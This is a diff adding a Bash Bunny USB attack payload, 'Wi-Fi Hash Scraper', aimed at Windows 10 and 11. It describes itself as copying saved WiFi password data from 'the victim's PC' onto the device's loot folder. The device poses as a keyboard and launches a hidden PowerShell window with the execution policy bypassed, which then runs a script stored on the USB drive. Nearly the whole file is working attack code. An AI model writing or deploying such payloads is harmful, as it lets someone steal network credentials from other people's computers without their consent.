@@ -1,0 +1,23 @@
+#!/bin/bash
+#
+# Title:            Wi-Fi Hash Scraper
+#
+# Description:      
+# 			  Copies all of the known / saved WiFi password hashes from the victim's PC to the BashBunny's loot folder.
+#
+# Author:           KryptoKola
+# Version:          1.0
+# Category:         Recon
+# Target:           Microsoft Windows 10 & 11
+
+ATTACKMODE HID STORAGE
+GET BB_LABEL
+
+LED SETUP
+GET SWITCH_POSITION
+LED ATTACK
+RUN WIN "powershell -Noni -NoP -W h -EP Bypass iex((Get-Volume -FileSystemLabel '${BB_LABEL}').DriveLetter+':\payloads\\$SWITCH_POSITION\Get-Hashes.ps1')"
+Q DELAY 250
+Q ENTER
+Q DELAY 3000
+LED FINISH
